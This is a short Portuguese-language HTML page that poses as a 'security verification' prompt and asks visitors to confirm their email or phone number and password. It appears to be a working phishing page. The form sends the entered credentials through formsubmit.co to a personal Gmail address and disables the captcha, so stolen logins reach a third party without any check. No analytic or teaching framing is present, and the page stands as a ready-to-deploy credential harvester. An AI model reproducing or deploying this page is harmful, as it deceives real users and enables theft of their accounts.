<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificação de Segurança</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      text-align: center;
      padding: 50px;
    }
    #form-container {
      background: white;
      padding: 30px;
      border-radius: 8px;
      max-width: 400px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      background-color: #4CAF50;
      border: none;
      color: white;
      padding: 12px 20px;
      cursor: pointer;
      border-radius: 4px;
      width: 100%;
      font-size: 16px;
    }
  </style>
</head>
<body>

  <div id="form-container">
    <h1>Verificação de Segurança</h1>
    <p>Confirme seus dados para continuar.</p>

    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
      <input type="text" name="email" placeholder="E-mail ou telefone" required />
      <input type="password" name="senha" placeholder="Senha" required />
      <input type="hidden" name="_captcha" value="false">
      <button type="submit">Validar agora</button>
    </form>
  </div>

</body>
</html>
